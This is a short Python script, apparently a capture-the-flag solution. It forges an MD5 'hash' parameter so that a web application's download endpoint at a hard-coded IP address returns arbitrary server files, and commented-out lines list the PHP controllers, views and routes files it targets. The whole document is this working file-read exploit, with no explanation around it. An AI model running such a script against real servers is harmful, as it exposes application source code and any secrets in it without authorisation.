import hashlib
import requests

#path = "/app/Controllers/Download.php"
#path = "/app/index.php"
#path = "/app/Routes.php"
path = "/app/Views/Admin.php"
path = "/app/Controllers/Custom.php"
#path = "/app/Controllers/Admin.php"
#path = "/app/Controllers/Url.php"

data = {"file": path, "hash": hashlib.md5(path).hexdigest()}
r = requests.get("http://68.183.31.62:94/download", params=data)
print(r.text)
